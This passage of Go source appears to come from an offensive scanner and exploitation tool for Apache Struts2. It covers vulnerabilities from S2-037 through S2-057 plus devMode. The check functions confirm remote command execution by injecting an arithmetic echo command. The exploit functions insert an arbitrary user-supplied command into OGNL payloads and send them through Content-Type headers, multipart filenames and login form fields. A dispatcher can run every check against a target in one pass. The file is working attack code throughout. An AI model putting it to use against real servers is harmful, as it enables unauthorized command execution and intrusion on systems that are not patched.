		SetHeader("User-Agent", utils.GlobalUserAgent).
		Get(reqUrl)
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		fmt.Println(resp.String())
	}
}

// PocS037 S2-037:影响版本Struts 2.3.20-2.3.28.1; GET请求发送数据; 支持获取WEB路径,任意命令执行;
func (c *WorkExp) PocS037() {
	r1 := rand.Intn(10000) + 1000
	r2 := rand.Intn(10000) + 1000
	Payload := c.Url + utils.ExecPayload037
	Payload = strings.Replace(Payload, "{cmd}", "echo `expr {{r1}} + {{r2}}`", -1)
	Payload = strings.Replace(Payload, "{{r1}}", string(r1), -1)
	Payload = strings.Replace(Payload, "{{r2}}", string(r2), -1)
	resp, err := client.R().
		SetHeader("User-Agent", utils.GlobalUserAgent).
		Get(Payload)
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		if strings.Contains(resp.String(), string(r1+r2)) {
			color.Red("*Found Struts2-037！")
		} else {
			fmt.Println("Struts2-037 Not Vulnerable.")
		}
	}
}

func (c *WorkExp) ExpS037Cmd() {
	Payload := c.Url + utils.ExecPayload037
	Payload = strings.Replace(Payload, "{cmd}", c.Cmd, -1)
	resp, err := client.R().
		SetHeader("User-Agent", utils.GlobalUserAgent).
		Get(Payload)
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		fmt.Println(resp.String())
	}
}

func (c *WorkExp) ExpS037GetPath() {
	Payload := c.Url + utils.WebPath037
	resp, err := client.R().
		SetHeader("User-Agent", utils.GlobalUserAgent).
		Get(Payload)
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		fmt.Println(resp.String())
	}
}

// PocS045 S2-045:影响版本Struts 2.3.5-2.3.31,2.5-2.5.10; POST请求发送数据,不需要参数; 支持获取WEB路径,任意命令执行;
func (c *WorkExp) PocS045() {
	var (
		resp *req.Response
		err  error
	)
	r1 := rand.Intn(10000) + 1000
	r2 := rand.Intn(10000) + 1000
	Payload := strings.Replace(utils.ExecPayload045, "{cmd}", "echo `expr {{r1}} + {{r2}}`", -1)
	Payload = strings.Replace(Payload, "{{r1}}", string(r1), -1)
	Payload = strings.Replace(Payload, "{{r2}}", string(r2), -1)

	if c.contentType == "" {
		resp, err = client.R().
			SetBody(c.postData).
			SetHeader("User-Agent", utils.GlobalUserAgent).
			SetHeader("Content-Type", Payload).
			Post(c.Url)
	}
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		if strings.Contains(resp.String(), string(r1+r2)) {
			color.Red("*Found Struts2-045！")
		} else {
			fmt.Println("Struts2-045 Not Vulnerable.")
		}
	}
}

func (c *WorkExp) ExpS045Cmd() {
	var (
		resp *req.Response
		err  error
	)
	Payload := strings.Replace(utils.ExecPayload045, "{cmd}", c.Cmd, -1)

	if c.contentType == "" {
		resp, err = client.R().
			SetBody(c.postData).
			SetHeader("User-Agent", utils.GlobalUserAgent).
			SetHeader("Content-Type", Payload).
			Post(c.Url)
	}
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		fmt.Println(resp.String())
	}
}

func (c *WorkExp) ExpS045GetPath() {
	var (
		resp *req.Response
		err  error
	)
	if c.contentType == "" {
		resp, err = client.R().
			SetBody(c.postData).
			SetHeader("User-Agent", utils.GlobalUserAgent).
			SetHeader("Content-Type", utils.WebPath045).
			Post(c.Url)
	}
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		fmt.Println(resp.String())
	}
}

// PocS046 S2-046:影响版本Struts 2.3.5-2.3.31,2.5-2.5.10; POST请求发送数据,不需要参数; 支持获取WEB路径,任意命令执行;
func (c *WorkExp) PocS046() {
	var (
		resp *req.Response
		err  error
	)
	r1 := rand.Intn(10000) + 1000
	r2 := rand.Intn(10000) + 1000
	Payload := strings.Replace(utils.CheckPoc046, "{cmd}", "echo `expr {{r1}} + {{r2}}`", -1)
	Payload = strings.Replace(Payload, "{{r1}}", string(r1), -1)
	Payload = strings.Replace(Payload, "{{r2}}", string(r2), -1)

	payload1 := `-----------------------------735323031399963166993862150 Content-Disposition: form-data; name="foo"; filename="%{(#nike='multipart/form-data').
{{payload}}
Content-Type: text/plain  
 x 
-----------------------------735323031399963166993862150--`
	c.postData = strings.Replace(payload1, "{{payload}}", Payload, -1)
	if c.contentType == "" {
		resp, err = client.R().
			SetBody(c.postData).
			SetHeader("User-Agent", utils.GlobalUserAgent).
			SetHeader("Content-Type", "multipart/form-data; boundary=---------------------------735323031399963166993862150").
			Post(c.Url)
	}
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		if strings.Contains(resp.String(), string(r1+r2)) {
			color.Red("*Found Struts2-046！")
		} else {
			fmt.Println("Struts2-046 Not Vulnerable.")
		}
	}
}

func (c *WorkExp) ExpS046Cmd() {
	var (
		resp *req.Response
		err  error
	)
	Payload := strings.Replace(utils.ExecPayload046, "{cmd}", c.Cmd, -1)

	payload1 := `-----------------------------735323031399963166993862150 Content-Disposition: form-data; name="foo"; filename="%{(#nike='multipart/form-data').
{{payload}}
Content-Type: text/plain  
 x 
-----------------------------735323031399963166993862150--`
	c.postData = strings.Replace(payload1, "{{payload}}", Payload, -1)
	if c.contentType == "" {
		resp, err = client.R().
			SetBody(c.postData).
			SetHeader("User-Agent", utils.GlobalUserAgent).
			SetHeader("Content-Type", "multipart/form-data; boundary=---------------------------735323031399963166993862150").
			Post(c.Url)
	}
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		fmt.Println(resp.String())
	}
}

func (c *WorkExp) ExpS046GetPath() {
	var (
		resp *req.Response
		err  error
	)
	payload1 := `-----------------------------735323031399963166993862150 Content-Disposition: form-data; name="foo"; filename="%{(#nike='multipart/form-data').
{{payload}}
Content-Type: text/plain  
 x 
-----------------------------735323031399963166993862150--`
	c.postData = strings.Replace(payload1, "{{payload}}", utils.WebPath046, -1)
	if c.contentType == "" {
		resp, err = client.R().
			SetBody(c.postData).
			SetHeader("User-Agent", utils.GlobalUserAgent).
			SetHeader("Content-Type", "multipart/form-data; boundary=---------------------------735323031399963166993862150").
			Post(c.Url)
	}
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		fmt.Println(resp.String())
	}
}

// PocS048 S2-048:影响版本Struts 2.3.x with Struts 1 plugin and Struts 1 action; POST请求发送数据; 默认参数为:username,password; 支持任意命令执行;
func (c *WorkExp) PocS048() {
	var (
		resp *req.Response
		err  error
	)
	r1 := rand.Intn(10000) + 1000
	r2 := rand.Intn(10000) + 1000
	Payload := strings.Replace(utils.ExecPayload048, "{cmd}", "echo `expr {{r1}} + {{r2}}`", -1)
	Payload = strings.Replace(Payload, "{{r1}}", string(r1), -1)
	Payload = strings.Replace(Payload, "{{r2}}", string(r2), -1)
	if c.postData == "" {
		c.postData = "username=" + Payload
	} else {
		c.postData = strings.Replace(c.postData, "{exp}", Payload, -1)
	}
	if c.contentType == "" {
		resp, err = client.R().
			SetBody(c.postData).
			SetHeader("User-Agent", utils.GlobalUserAgent).
			SetHeader("Content-Type", "application/x-www-form-urlencoded").
			Post(c.Url)
	} else {
		resp, err = client.R().
			SetBody(c.postData).
			SetHeader("User-Agent", utils.GlobalUserAgent).
			SetHeader("Content-Type", c.contentType).
			Post(c.Url)
	}
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		if strings.Contains(resp.String(), string(r1+r2)) {
			color.Red("*Found Struts2-048！")
		} else {
			if c.postData == "" {
				c.postData = "password=" + Payload
			} else {
				c.postData = strings.Replace(c.postData, "{exp}", Payload, -1)
			}
			if c.contentType == "" {
				resp, err = client.R().
					SetBody(c.postData).
					SetHeader("User-Agent", utils.GlobalUserAgent).
					SetHeader("Content-Type", "application/x-www-form-urlencoded").
					Post(c.Url)
			} else {
				resp, err = client.R().
					SetBody(c.postData).
					SetHeader("User-Agent", utils.GlobalUserAgent).
					SetHeader("Content-Type", c.contentType).
					Post(c.Url)
			}
			if err != nil { // Error handling.
				//log.Println("error:", err)
			}
			if resp != nil {
				if strings.Contains(resp.String(), string(r1+r2)) {
					color.Red("*Found Struts2-048！")
				} else {
					fmt.Println("Struts2-048 Not Vulnerable.")
				}
			}
		}
	}
}

func (c *WorkExp) ExpS048Cmd() {
	var (
		resp *req.Response
		err  error
	)

	Payload := strings.Replace(utils.ExecPayload048, "{cmd}", c.Cmd, -1)
	if c.postData == "" {
		c.postData = "username=" + Payload
	} else {
		c.postData = strings.Replace(c.postData, "{exp}", Payload, -1)
	}
	if c.contentType == "" {
		resp, err = client.R().
			SetBody(c.postData).
			SetHeader("User-Agent", utils.GlobalUserAgent).
			SetHeader("Content-Type", "application/x-www-form-urlencoded").
			Post(c.Url)
	} else {
		resp, err = client.R().
			SetBody(c.postData).
			SetHeader("User-Agent", utils.GlobalUserAgent).
			SetHeader("Content-Type", c.contentType).
			Post(c.Url)
	}
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		fmt.Println(resp.String())
	}

	if c.postData == "" {
		c.postData = "password=" + Payload
	} else {
		c.postData = strings.Replace(c.postData, "{exp}", Payload, -1)
	}
	if c.contentType == "" {
		resp, err = client.R().
			SetBody(c.postData).
			SetHeader("User-Agent", utils.GlobalUserAgent).
			SetHeader("Content-Type", "application/x-www-form-urlencoded").
			Post(c.Url)
	} else {
		resp, err = client.R().
			SetBody(c.postData).
			SetHeader("User-Agent", utils.GlobalUserAgent).
			SetHeader("Content-Type", c.contentType).
			Post(c.Url)
	}
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		fmt.Println(resp.String())
	}
}

// ExpS052Cmd S2-052:影响版本Struts 2.1.2-2.3.33,2.5-2.5.12; POST请求发送数据,不需要参数; 支持任意命令执行(无回显);
func (c *WorkExp) ExpS052Cmd() {
	var (
		resp *req.Response
		err  error
	)
	c.postData = strings.Replace(utils.ExecPayload052, "{cmd}", c.Cmd, -1)
	if c.contentType == "" {
		resp, err = client.R().
			SetBody(c.postData).
			SetHeader("User-Agent", utils.GlobalUserAgent).
			SetHeader("Content-Type", "application/xml").
			Post(c.Url)
	}
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		fmt.Println(resp)
	}
}

// PocS053 S2-053:影响版本Struts 2.0.1-2.3.33,2.5-2.5.10; POST请求发送数据; 默认参数为:username,password; 支持任意命令执行;
func (c *WorkExp) PocS053() {
	var (
		resp *req.Response
		err  error
	)
	r1 := rand.Intn(10000) + 1000
	r2 := rand.Intn(10000) + 1000
	Payload := strings.Replace(utils.ExecPayload053, "{cmd}", "echo `expr {{r1}} + {{r2}}`", -1)
	Payload = strings.Replace(Payload, "{{r1}}", string(r1), -1)
	Payload = strings.Replace(Payload, "{{r2}}", string(r2), -1)
	if c.postData == "" {
		c.postData = "username=" + Payload
	} else {
		c.postData = strings.Replace(c.postData, "{exp}", Payload, -1)
	}
	if c.contentType == "" {
		resp, err = client.R().
			SetBody(c.postData).
			SetHeader("User-Agent", utils.GlobalUserAgent).
			SetHeader("Content-Type", "application/x-www-form-urlencoded").
			Post(c.Url)
	} else {
		resp, err = client.R().
			SetBody(c.postData).
			SetHeader("User-Agent", utils.GlobalUserAgent).
			SetHeader("Content-Type", c.contentType).
			Post(c.Url)
	}
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		if strings.Contains(resp.String(), string(r1+r2)) {
			color.Red("*Found Struts2-053！")
		} else {
			if c.postData == "" {
				c.postData = "password=" + Payload
			} else {
				c.postData = strings.Replace(c.postData, "{exp}", Payload, -1)
			}
			if c.contentType == "" {
				resp, err = client.R().
					SetBody(c.postData).
					SetHeader("User-Agent", utils.GlobalUserAgent).
					SetHeader("Content-Type", "application/x-www-form-urlencoded").
					Post(c.Url)
			} else {
				resp, err = client.R().
					SetBody(c.postData).
					SetHeader("User-Agent", utils.GlobalUserAgent).
					SetHeader("Content-Type", c.contentType).
					Post(c.Url)
			}
			if err != nil { // Error handling.
				//log.Println("error:", err)
			}
			if resp != nil {
				if strings.Contains(resp.String(), string(r1+r2)) {
					color.Red("*Found Struts2-053！")
				} else {
					fmt.Println("Struts2-053 Not Vulnerable.")
				}
			}
		}
	}
}

func (c *WorkExp) ExpS053Cmd() {
	var (
		resp *req.Response
		err  error
	)
	Payload := strings.Replace(utils.ExecPayload053, "{cmd}", c.Cmd, -1)
	if c.postData == "" {
		c.postData = "username=" + Payload
	} else {
		c.postData = strings.Replace(c.postData, "{exp}", Payload, -1)
	}
	if c.contentType == "" {
		resp, err = client.R().
			SetBody(c.postData).
			SetHeader("User-Agent", utils.GlobalUserAgent).
			SetHeader("Content-Type", "application/x-www-form-urlencoded").
			Post(c.Url)
	} else {
		resp, err = client.R().
			SetBody(c.postData).
			SetHeader("User-Agent", utils.GlobalUserAgent).
			SetHeader("Content-Type", c.contentType).
			Post(c.Url)
	}
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		fmt.Println(resp.String())
	}

	if c.postData == "" {
		c.postData = "password=" + Payload
	} else {
		c.postData = strings.Replace(c.postData, "{exp}", Payload, -1)
	}
	if c.contentType == "" {
		resp, err = client.R().
			SetBody(c.postData).
			SetHeader("User-Agent", utils.GlobalUserAgent).
			SetHeader("Content-Type", "application/x-www-form-urlencoded").
			Post(c.Url)
	} else {
		resp, err = client.R().
			SetBody(c.postData).
			SetHeader("User-Agent", utils.GlobalUserAgent).
			SetHeader("Content-Type", c.contentType).
			Post(c.Url)
	}
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		fmt.Println(resp.String())
	}

}

// S2-devMode:影响版本Struts 2.1.0-2.3.1; GET请求发送数据; 支持获取WEB路径,任意命令执行
func (c *WorkExp) PocDevMode() {
	r1 := rand.Intn(10000) + 1000
	r2 := rand.Intn(10000) + 1000
	Payload := c.Url + utils.ExecPayloadDevMode
	Payload = strings.Replace(Payload, "{cmd}", "echo `expr {{r1}} + {{r2}}`", -1)
	Payload = strings.Replace(Payload, "{{r1}}", string(r1), -1)
	Payload = strings.Replace(Payload, "{{r2}}", string(r2), -1)
	resp, err := client.R().
		SetHeader("User-Agent", utils.GlobalUserAgent).
		Get(Payload)
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		if strings.Contains(resp.String(), string(r1+r2)) {
			color.Red("*Found Struts2-devMode！")
		} else {
			fmt.Println("Struts2-devMode Not Vulnerable.")
		}
	}
}

func (c *WorkExp) ExpDevModeCmd() {
	Payload := c.Url + utils.ExecPayloadDevMode
	Payload = strings.Replace(Payload, "{cmd}", c.Cmd, -1)
	resp, err := client.R().
		SetHeader("User-Agent", utils.GlobalUserAgent).
		Get(Payload)
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		fmt.Println(resp.String())
	}
}

func (c *WorkExp) ExpDevModeGetPath() {
	Payload := c.Url + utils.WebPathDevMode
	resp, err := client.R().
		SetHeader("User-Agent", utils.GlobalUserAgent).
		Get(Payload)
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		fmt.Println(resp.String())
	}
}

// PocS057 S2-057:影响版本Struts 2.0.4-2.3.34, Struts 2.5.0-2.5.16; GET请求发送数据; 支持任意命令执行
func (c *WorkExp) PocS057() {
	r1 := rand.Intn(10000) + 1000
	r2 := rand.Intn(10000) + 1000
	Payload := c.Url + utils.ExecPayload057a
	Payload = strings.Replace(Payload, "{cmd}", "echo `expr {{r1}} + {{r2}}`", -1)
	Payload = strings.Replace(Payload, "{{r1}}", string(r1), -1)
	Payload = strings.Replace(Payload, "{{r2}}", string(r2), -1)
	resp, err := client.R().
		SetHeader("User-Agent", utils.GlobalUserAgent).
		Get(Payload)
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		if strings.Contains(resp.String(), string(r1+r2)) {
			color.Red("*Found Struts2-057！-> ExecPayload057a")
		} else {
			fmt.Println("Struts2-057 Not Vulnerable. -> ExecPayload057a")
		}
	}

	Payload = c.Url + utils.ExecPayload057b
	Payload = strings.Replace(Payload, "{cmd}", "echo `expr {{r1}} + {{r2}}`", -1)
	Payload = strings.Replace(Payload, "{{r1}}", string(r1), -1)
	Payload = strings.Replace(Payload, "{{r2}}", string(r2), -1)
	resp, err = client.R().
		SetHeader("User-Agent", utils.GlobalUserAgent).
		Get(Payload)
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		if strings.Contains(resp.String(), string(r1+r2)) {
			color.Red("*Found Struts2-057！-> ExecPayload057b")
		} else {
			fmt.Println("Struts2-057 Not Vulnerable. -> ExecPayload057b")
		}
	}

	Payload = c.Url + utils.ExecPayload057c
	Payload = strings.Replace(Payload, "{cmd}", "echo `expr {{r1}} + {{r2}}`", -1)
	Payload = strings.Replace(Payload, "{{r1}}", string(r1), -1)
	Payload = strings.Replace(Payload, "{{r2}}", string(r2), -1)
	resp, err = client.R().
		SetHeader("User-Agent", utils.GlobalUserAgent).
		Get(Payload)
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		if strings.Contains(resp.String(), string(r1+r2)) {
			color.Red("*Found Struts2-057！-> ExecPayload057c")
		} else {
			fmt.Println("Struts2-057 Not Vulnerable. -> ExecPayload057c")
		}
	}

	Payload = c.Url + utils.ExecPayload057d
	Payload = strings.Replace(Payload, "{cmd}", "echo `expr {{r1}} + {{r2}}`", -1)
	Payload = strings.Replace(Payload, "{{r1}}", string(r1), -1)
	Payload = strings.Replace(Payload, "{{r2}}", string(r2), -1)
	resp, err = client.R().
		SetHeader("User-Agent", utils.GlobalUserAgent).
		Get(Payload)
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		if strings.Contains(resp.String(), string(r1+r2)) {
			color.Red("*Found Struts2-057！-> ExecPayload057d")
		} else {
			fmt.Println("Struts2-057 Not Vulnerable. -> ExecPayload057d")
		}
	}
}

func (c *WorkExp) ExpS057Cmd() {
	Payload := c.Url + utils.ExecPayload057a
	Payload = strings.Replace(Payload, "{cmd}", c.Cmd, -1)
	resp, err := client.R().
		SetHeader("User-Agent", utils.GlobalUserAgent).
		Get(Payload)
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		fmt.Println(resp.String())
	}

	Payload = c.Url + utils.ExecPayload057b
	Payload = strings.Replace(Payload, "{cmd}", c.Cmd, -1)
	resp, err = client.R().
		SetHeader("User-Agent", utils.GlobalUserAgent).
		Get(Payload)
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		fmt.Println(resp.String())
	}

	Payload = c.Url + utils.ExecPayload057c
	Payload = strings.Replace(Payload, "{cmd}", c.Cmd, -1)
	resp, err = client.R().
		SetHeader("User-Agent", utils.GlobalUserAgent).
		Get(Payload)
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		fmt.Println(resp.String())
	}

	Payload = c.Url + utils.ExecPayload057d
	Payload = strings.Replace(Payload, "{cmd}", c.Cmd, -1)
	resp, err = client.R().
		SetHeader("User-Agent", utils.GlobalUserAgent).
		Get(Payload)
	if err != nil { // Error handling.
		//log.Println("error:", err)
	}
	if resp != nil {
		fmt.Println(resp.String())
	}
}

func (c *WorkExp) Run() {
	switch c.CveName {
	// s2-001
	case "s2-001":
		c.PocS001()
	case "s2-001_Cmd":
		c.ExpS001Cmd()
	case "s2-001_WebPath":
		c.ExpS001GetPath()
		// s2-003
	case "s2-003":
		c.PocS003()
	case "s2-003_Cmd":
		c.ExpS003Cmd()
		// s2-005
	case "s2-005":
		c.PocS005()
	case "s2-005_Cmd":
		c.ExpS005Cmd()
	case "s2-005_WebPath":
		c.ExpS005GetPath()
		//s2-007
	case "s2-007":
		c.PocS007()
	case "s2-007_Cmd":
		c.ExpS007Cmd()
		//s2-008
	case "s2-008":
		c.PocS008()
	case "s2-008_Cmd":
		c.ExpS008Cmd()
		//s2-009
	case "s2-009":
		c.PocS009()
	case "s2-009_Cmd":
		c.ExpS009Cmd()
		//s2-012
	case "s2-012":
		c.PocS012()
	case "s2-012_Cmd":
		c.ExpS012Cmd()
		//s2-013
	case "s2-013":
		c.PocS013()
	case "s2-013_Cmd":
		c.ExpS013Cmd()
	case "s2-012_WebPath":
		c.ExpS013GetPath()
		//s2-015
	case "s2-015":
		c.PocS015()
	case "s2-015_Cmd":
		c.ExpS015Cmd()
		//s2-016
	case "s2-016":
		c.PocS016()
	case "s2-016_Cmd":
		c.ExpS016Cmd()
	case "s2-016_WebPath":
		c.ExpS016GetPath()
		//s2-019
	case "s2-019":
		c.PocS019()
	case "s2-019_Cmd":
		c.ExpS019Cmd()
	case "s2-019_WebPath":
		c.ExpS019GetPath()
		//s2-029
	case "s2-029":
		c.PocS029()
	case "s2-029_Cmd":
		c.ExpS029Cmd()
		//s2-032
	case "s2-032":
		c.PocS032()
	case "s2-032_Cmd":
		c.ExpS032Cmd()
	case "s2-032_WebPath":
		c.ExpS032GetPath()
		//s2-033
	case "s2-033":
		c.PocS033()
	case "s2-033_Cmd":
		c.ExpS033Cmd()
		//s2-037
	case "s2-037":
		c.PocS037()
	case "s2-037_Cmd":
		c.ExpS037Cmd()
	case "s2-037_WebPath":
		c.ExpS037GetPath()
		//s2-045
	case "s2-045":
		c.PocS045()
	case "s2-045_Cmd":
		c.ExpS045Cmd()
	case "s2-045_WebPath":
		c.ExpS045GetPath()
		//s2-046
	case "s2-046":
		c.PocS046()
	case "s2-046_Cmd":
		c.ExpS046Cmd()
	case "s2-046_WebPath":
		c.ExpS046GetPath()
		//s2-048
	case "s2-048":
		c.PocS048()
	case "s2-048_Cmd":
		c.ExpS048Cmd()
		//s2-052
	case "s2-052_Cmd":
		c.ExpS052Cmd()
		//s2-053
	case "s2-053":
		c.PocS053()
	case "s2-053_Cmd":
		c.ExpS053Cmd()
		//s2-devMode
	case "s2-devMode":
		c.PocDevMode()
	case "s2-devMode_Cmd":
		c.ExpDevModeCmd()
	case "s2-devMode_WebPath":
		c.ExpDevModeGetPath()
		// s2-057
	case "s2-057":
		c.PocS057()
	case "s2-057_Cmd":
		c.ExpS057Cmd()
	case "allPoc":
		c.PocS001()
		c.PocS003()
		c.PocS005()
		c.PocS007()
		c.PocS008()
		c.PocS009()
		c.PocS012()
		c.PocS013()
		c.PocS015()
		c.PocS016()
		c.PocS019()
		c.PocS029()
		c.PocS032()
		c.PocS033()
		c.PocS037()
		c.PocS045()
		c.PocS046()
		c.PocS048()
		c.PocS053()
		c.PocDevMode()
		c.PocS057()
	}
}
